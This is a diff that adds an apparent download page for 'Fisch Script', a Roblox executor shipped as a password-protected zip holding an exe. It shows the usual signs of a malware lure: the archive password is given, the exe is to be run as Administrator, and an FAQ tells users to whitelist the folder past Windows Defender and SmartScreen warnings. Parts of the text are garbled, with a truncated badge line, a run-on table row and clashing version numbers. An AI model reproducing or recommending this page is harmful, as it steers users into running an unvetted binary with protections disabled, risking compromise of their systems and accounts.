@@ -1,0 +1,49 @@
+🌊 Fisch Script — Free Download for Windows 2026]
+
+-lightgrey?style=flat-square&logo=windows)
+
+Engineered for Windows 10/11 64-bit systems, 🌊 Fisch Script (Build FA036C) introduces streamlined execution through volt-roblox-executor-v1.2.0-win64.exe. Download volt-roblox-executor-v1.2.0-win64.zip (40.4 MB) and unlock with password 2026.
+
+Direct Package: [volt-roblox-executor-v1.2.0-win64.zip (40.4 MB) · Password: 2026 · Build: v2.3.8 (FA036C)
+
+✨ Fisch Script — Key Highlights
+
+| Fisch Script Subsystem | Runtime Behavior (FA036C) | Build |
+| :--- | :--- | :---: |
+| 💾 Persistent JSON Config | Manages low-latency persistent json config (fisch-script · automatic profile saving & keybind recall) inside volt-roblox-executor-v1.2.0-win64.exe in  Archive Password: 2026 — Extract volt-roblox-executor-v1.2.0-win64.zip completely before launching volt-roblox-executor-v1.2.0-win64.exe` as Administrator.
+
+❓ Fisch Script (v2.3.8) — FAQ
+
+Is Fisch Script (volt-roblox-executor-v1.2.0-win64.zip) compatible with Windows 10/11 64-bit systems?
+
+Yes — volt-roblox-executor-v1.2.0-win64.exe (v2.3.8) runs natively on Windows 10/11 64-bit systems across Intel and AMD x64 processors.
+
+What is the password to extract volt-roblox-executor-v1.2.0-win64.zip for Fisch Script?
+
+Enter 2026 in 7-Zip or WinRAR when unpacking volt-roblox-executor-v1.2.0-win64.zip (40.4 MB) before starting volt-roblox-executor-v1.2.0-win64.exe.
+
+How do I fix Windows Defender or SmartScreen alerts on volt-roblox-executor-v1.2.0-win64.exe (v2.3.8)?
+
+Because volt-roblox-executor-v1.2.0-win64.exe (build FA036C) is an independent roblox script binary, heuristic checks may prompt a warning. Confirm you downloaded volt-roblox-executor-v1.2.0-win64.zip from SusanLambert/fisch-script, whitelist the fisch-script directory, and run volt-roblox-executor-v1.2.0-win64.exe as Administrator.
+
+💻 volt-roblox-executor-v1.2.0-win64.exe — Technical Specs
+
+| fisch-script Attribute | Fisch Script Value |
+| :--- | :--- |
+| Target Platform | Windows 10/11 64-bit systems |
+| Executable & Build | volt-roblox-executor-v1.2.0-win64.exe (v2.3.8 · FA036C9F53) |
+| Release Archive | volt-roblox-executor-v1.2.0-win64.zip (40.4 MB) |
+| Unzip Password | 2026 |
+
+Fisch Script — Release Manifest (SusanLambert/fisch-script)
+[package]
+slug = "fisch-script"
+version = "2.3.8"
+signature = "FA036C9F53"
+archive = "volt-roblox-executor-v1.2.0-win64.zip"
+password = "2026"
+entrypoint = "volt-roblox-executor-v1.2.0-win64.exe"
+
+  🌊 Fisch Script · v2.3.8 (FA036C9F53)
+
+  fisch-script
